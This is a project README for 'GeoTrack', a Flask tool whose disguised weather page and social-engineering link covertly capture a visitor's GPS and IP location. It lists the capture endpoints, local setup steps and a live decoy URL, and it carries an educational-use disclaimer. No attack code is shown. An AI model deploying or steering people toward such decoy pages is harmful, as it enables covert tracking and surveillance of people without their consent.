# 🌐 GeoTrack — Location Intelligence Platform

![GeoTrack](https://img.shields.io/badge/GeoTrack-v2.0-00f5ff?style=for-the-badge&logo=googlemaps)
![Python](https://img.shields.io/badge/Python-3.8+-3776AB?style=for-the-badge&logo=python)
![Flask](https://img.shields.io/badge/Flask-Backend-000000?style=for-the-badge&logo=flask)
![Leaflet](https://img.shields.io/badge/Leaflet.js-Maps-199900?style=for-the-badge&logo=leaflet)
![License](https://img.shields.io/badge/License-Educational_Only-ff3c6e?style=for-the-badge)

> ⚠️ **ETHICAL USE ONLY** — This tool is built strictly for cybersecurity education, OSINT research, and ethical demonstrations. Unauthorized tracking is illegal. Always obtain explicit consent.

---

## 🔗 Live Demo

| | Link |
|---|---|
| 🌐 **Dashboard** | [https://ge0track.netlify.app](https://ge0track.netlify.app) |
| ⚙️ **Backend API** | [https://weatherforecast-live.up.railway.app](https://weatherforecast-live.up.railway.app) |
| 🌤️ **Fake Weather Page** | [https://weatherforecast-live.up.railway.app/forecast/world](https://weatherforecast-live.up.railway.app/forecast/world) |

---

## 📸 Features

| Feature | Description |
|---|---|
| 🗺️ **Map Tracker** | GPS + coordinate-based location mapping with reverse geocoding |
| 🛰️ **Satellite / Normal View** | Toggle between OpenStreetMap and Esri satellite view on all maps |
| 🔗 **Fake Link** | Social engineering simulation page with GPS + IP capture |
| 🌐 **IP Lookup** | Full IP intelligence — city, ISP, timezone, coordinates |
| 📡 **Capture Log** | Live capture dashboard with auto-refresh every 5s |
| 🌤️ **Fake Weather Page** | Convincing decoy page that silently captures GPS/IP location |
| 🔐 **Session Tokens** | Private captures — only you can see your data |
| ✉️ **Contact Form** | EmailJS-powered form — messages delivered directly to developer inbox |

---

## 🗂️ Project Structure

```
GeoTrack/
├── index.html       ← Frontend dashboard (single file, all pages)
├── server.py        ← Flask backend (API + fake weather page)
├── requirements.txt ← Python dependencies
└── README.md
```

---

## ⚙️ Local Setup (Run on Your PC)

### Step 1 — Clone the Repository

```bash
git clone https://github.com/harsh160311/Geo-Track
cd Geo-Track
```

### Step 2 — Install Dependencies

```bash
pip install flask flask-cors requests gunicorn
```

### Step 3 — Run the Server

```bash
python server.py
```

### Step 4 — Open the Dashboard

```
http://localhost:5000
```

---

## 📡 API Endpoints

| Endpoint | Method | Description |
|---|---|---|
| `/` | GET | Serves the main dashboard |
| `/forecast/world` | GET | Fake weather page (capture trigger) |
| `/api/ip` | GET | Returns caller's IP info |
| `/api/ip/<ip>` | GET | Lookup any IP address |
| `/api/reverse?lat=&lon=` | GET | Reverse geocode coordinates |
| `/api/session` | GET | Create private session token |
| `/api/capture` | POST | Save a captured location |
| `/api/captures?token=` | GET | Get your session's captures |

---

## 🛠️ Tech Stack

| Layer | Technology |
|---|---|
| **Frontend** | HTML5, CSS3 (Cyberpunk UI), Vanilla JS |
| **Maps** | Leaflet.js + OpenStreetMap + Esri Satellite |
| **Backend** | Python 3, Flask, Flask-CORS |
| **Geocoding** | Nominatim (OpenStreetMap) |
| **IP Intelligence** | ip-api.com |
| **Contact Form** | EmailJS (client-side email delivery) |
| **Deployment** | Railway (backend) + Netlify (frontend) |

---

## ✉️ EmailJS Setup (Contact Form)

To enable real email delivery from the contact form:

1. Register at [emailjs.com](https://www.emailjs.com) (free)
2. Add a **Gmail service** → copy your **Service ID**
3. Create a **template** with these variables:
   ```
   {{from_name}}  {{from_email}}  {{subject}}  {{message}}
   ```
   Copy your **Template ID**
4. Go to **Account → General** → copy your **Public Key**
5. Open `index.html` and replace these 3 lines:

```js
var EJS_PK  = 'YOUR_PUBLIC_KEY';
var EJS_SID = 'YOUR_SERVICE_ID';
var EJS_TID = 'YOUR_TEMPLATE_ID';
```

---

## ⚠️ Legal Disclaimer

This project is created **strictly for educational purposes**:

- ✅ Cybersecurity awareness demonstrations
- ✅ OSINT research in controlled environments
- ✅ Personal learning and ethical hacking practice
- ❌ Tracking individuals without consent
- ❌ Any unauthorized surveillance
- ❌ Illegal use of any kind

**Misuse of this tool is illegal and strictly prohibited.**

---

## 👨‍💻 Author

**Harsh** — Sirsa, Haryana, India
Built with ❤️ for ethical cybersecurity education.

---

*GeoTrack v2.0 © 2026 — Educational Use Only*
